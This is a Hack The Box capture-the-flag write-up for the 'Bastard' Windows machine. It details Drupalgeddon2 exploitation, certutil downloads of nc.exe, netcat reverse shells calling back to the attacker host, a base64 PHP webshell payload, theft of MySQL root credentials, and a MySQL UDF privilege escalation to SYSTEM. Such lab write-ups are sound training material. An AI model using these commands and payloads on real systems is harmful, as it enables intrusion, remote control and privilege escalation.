---
title: Hack The Box - Bastard (Without Metasploit)
date: 2021-01-12 23:08:00 +0800
categories: [hackthebox]
tags: [windows, drupal, mysql]
image:
    path: /assets/images/bastard.png
---

# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

```bash
$ echo "10.10.10.9 bastard.htb" | sudo tee -a /etc/hosts
```

# Reconnaissance

To speed up my recon, I've moved to [`rustscan`](https://github.com/RustScan/RustScan). I've also created 2 "aliases" called `superscan` and `resolve`.

```bash 
$ which resolve 
resolve () {
        cat /etc/hosts | grep --color=auto "$1" | cut -d " " -f 1
}

$ which superscan
superscan () {
        name="$(resolve $1)" 
        rustscan --accessible -a "$name" -r 1-65535 -- -sT -sV -sC -Pn
}

$ superscan bastard.htb 
File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.10.9:80
Open 10.10.10.9:135
Open 10.10.10.9:49154
Starting Script(s)
Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-12 12:54 UTC
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:54
Completed NSE at 12:54, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:54
Completed NSE at 12:54, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:54
Completed NSE at 12:54, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 12:54
Completed Parallel DNS resolution of 1 host. at 12:54, 0.20s elapsed
DNS resolution of 1 IPs took 0.20s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:54
Scanning 10.10.10.9 [3 ports]
Discovered open port 49154/tcp on 10.10.10.9
Discovered open port 80/tcp on 10.10.10.9
Discovered open port 135/tcp on 10.10.10.9
Completed Connect Scan at 12:54, 0.01s elapsed (3 total ports)
Initiating Service scan at 12:54
Scanning 3 services on 10.10.10.9
Completed Service scan at 12:55, 53.72s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.10.9.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:55
Completed NSE at 12:55, 6.27s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:55
Completed NSE at 12:55, 2.41s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:55
Completed NSE at 12:55, 0.00s elapsed
Nmap scan report for 10.10.10.9
Host is up, received user-set (0.011s latency).
Scanned at 2021-01-12 12:54:56 UTC for 63s

PORT      STATE SERVICE REASON  VERSION
80/tcp    open  http    syn-ack Microsoft IIS httpd 7.5
|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries 
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php 
| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/ 
| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/ 
| /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/ 
|_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp   open  msrpc   syn-ack Microsoft Windows RPC
49154/tcp open  msrpc   syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:55
Completed NSE at 12:55, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:55
Completed NSE at 12:55, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:55
Completed NSE at 12:55, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.07 seconds
```

# Enumeration (1)

## Port 80 `Microsoft IIS httpd 7.5`

![](/assets/images/bastard1.png)

We see that the web server is running `Drupal`. Out of the files that `nmap` identified from `robots.txt`, the `CHANGELOG.txt` tells us about the version of `Drupal` that is installed.

```bash
$ curl http://bastard.htb/CHANGELOG.txt
Drupal 7.54, 2017-02-01
...
```

This version of `Drupal` can be exploited by `Drupalgeddon 2`, and an exploit script can be found [here](https://github.com/dreadlocked/Drupalgeddon2) on Github.

```bash
$ git clone https://github.com/dreadlocked/Drupalgeddon2
```

This script depends on a ruby module called `highline`, so lets install it.

```bash
$ sudo gem install highline
```

# Exploitation (1)

```bash
$ ruby drupalgeddon2.rb http://bastard.htb
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://bastard.htb/
--------------------------------------------------------------------------------
[+] Found  : http://bastard.htb/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.54
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[+] Result : Clean URLs enabled
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo KNYMIYXL
[+] Result : KNYMIYXL
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://bastard.htb/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Existing file   (http://bastard.htb/sites/default/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (sites/default/)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Existing file   (http://bastard.htb/sites/default/files/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (sites/default/files/)
[*] Moving : ./sites/default/files/.htaccess
[i] Payload: mv -f sites/default/files/.htaccess sites/default/files/.htaccess-bak; echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/files/shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
[!] FAILED : Couldn't find a writeable web path
--------------------------------------------------------------------------------
[*] Dropping back to direct OS commands
drupalgeddon2>> whoami
nt authority\iusr
```

The exploit attempts to write a webshell to various locations but was unable to do so, so it fellback to just running commands instead. Before enumerating further, lets get a more interactive shell.

We started our `nc` listener and we will upload a `nc.exe` to the machine and execute it to connect back to us.

```
drupalgeddon2>> mkdir C:\temp

drupalgeddon2>>  certutil -f -split -urlcache http://10.10.XX.XX/nc.exe C:\temp\nc.exe
****  Online  ****
  0000  ...
  e800
CertUtil: -URLCache command completed successfully.
drupalgeddon2>> C:\temp\nc.exe -e cmd.exe 10.10.XX.XX 1337
```

On our listener, we get our interactive shell.

```bash
$ rlwrap nc -lvnp 1337 
listening on [any] 1337 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.9] 49251
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>
```

# user.txt

The user flag is located in `dimitris`' Desktop.

```
C:\Users\dimitris\Desktop> type user.txt
ba22XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

# Enumeration (2)

When we list the processes that are running, we see that `mysqld.exe` is running.

```
C:\Users\dimitris\Desktop> tasklist
Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
...
mysqld.exe                    1064                            0     38.056 K
...
```

We can also see that it is running on port `3306`.
```
C:\Users\dimitris\Desktop> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  ...
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1064
  ...
```

Lets see if we can find any `MySQL` credentials lying around. `Drupal`'s config is the first place we should check.

```
C:\inetpub\drupal-7.54\sites\default>type settings.php
...
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'root',
      'password' => 'mysql123!root',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
...
```

Nice, we got the `root` credentials! Now to access the database, we could run the `MySQL` client that is installed on the machine but it will bug out our shell so lets do some port forwarding with `plink.exe` so that we can connect from our attacker machine instead.

First lets setup our `OpenSSH` server. As HackTheBox has disabled outgoing connections from the machines via port `22`, we will need to configure our `SSH` server to run on another port and start it.

```bash
$ cat /etc/ssh/sshd_config
...
Port 2222
...
$ sudo systemctl start ssh
```

Now we need to upload `plink.exe` to the machine which you can get from `/usr/share/windows-resources/binaries/`.

```
C:\inetpub\drupal-7.54> certutil -f -split -urlcache http://10.10.XX.XX/plink.exe C:\temp\plink.exe
****  Online  ****
  000000  ...
  04c000
CertUtil: -URLCache command completed successfully.
```

And then proceed to portforward.

```
C:\inetpub\drupal-7.54> C:\temp\plink.exe -l kali -pw kali 10.10.XX.XX -R 3306:127.0.0.1:3306 -P 2222
```

Now if we check the open ports on our attacker machine, we should see the port `3306`.

```bash
$ netstat -peanut 
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    
...               
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      1000       526480     - 
...
```

Now let's try accessing the `MySQL` server with the credentials that we found.

```bash
$ mysql -uroot -p -h 127.0.0.1 -pmysql123\!root 
MySQL [(none)]> select @@version;
+-----------+
| @@version |
+-----------+
| 5.5.45    |
+-----------+
```

# Exploitation (2)

As `root`, we can write to files and load arbitrary plugins. We can use this to create a `sys_exec` function that will run any commands as the user that `MySQL` is running as.  But first, we will need to figure out what architecture the OS is in as well as figure out where the plugins are stored.

```bash
MySQL [(none)]> select@@version_compile_os, @@version_compile_machine;
+----------------------+---------------------------+
| @@version_compile_os | @@version_compile_machine |
+----------------------+---------------------------+
| Win64                | x86                       |
+----------------------+---------------------------+

MySQL [(none)]> select@@plugin_dir ;
+-----------------------------------------------------+
| @@plugin_dir                                        |
+-----------------------------------------------------+
| C:\Program Files\MySQL\MySQL Server 5.5\lib\plugin\ |
+-----------------------------------------------------+
```

We will need to get a copy of `lib_mysqludf_sys_64.dll` which you can get from `/usr/share/metasploit-framework/data/exploits/mysql/`. We will then share it over `SMB` using `smbserver.py` from `impacket`.

```bash
$ mkdir udf
$ cd udf
$ cp /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll .
$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali . -smb2support
[sudo] password for kali: 
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Then we just execute the following commands on `MySQL` to load the plugin.

```bash
MySQL [(none)]> select load_file('\\\\10.10.XX.XX\\kali\\lib_mysqludf_sys_64.dll') into dumpfile "C:\\Program Files\\MySQL\\MySQL Server 5.5\\lib\\plugin\\udf.dll";
MySQL [(none)]> create function sys_exec returns int soname 'udf.dll';
```

Now, we can run any commands using `sys_exec`. We start our `nc` listener:

```bash
$ nc -lvnp 1337
listening on [any] 1337 ...
```

And run the following on `MySQL` to connect back to us.

```bash
MySQL [(none)]> select sys_exec("C:\\temp\\nc.exe -e cmd.exe 10.10.XX.XX 1337");
```

We then get a shell as `SYSTEM` on our listener!

```bash
$ rlwrap nc -lvnp 1337 
listening on [any] 1337 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.9] 49271
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ProgramData\MySQL\MySQL Server 5.5\Data> whoami
nt authority\system
```

# root.txt

The root flag was located in `Administrator`'s Desktop.

```
C:\Users\Administrator\Desktop>type root.txt.txt
4bf1XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```


### Rooted ! Thank you for reading and look forward for more writeups and articles !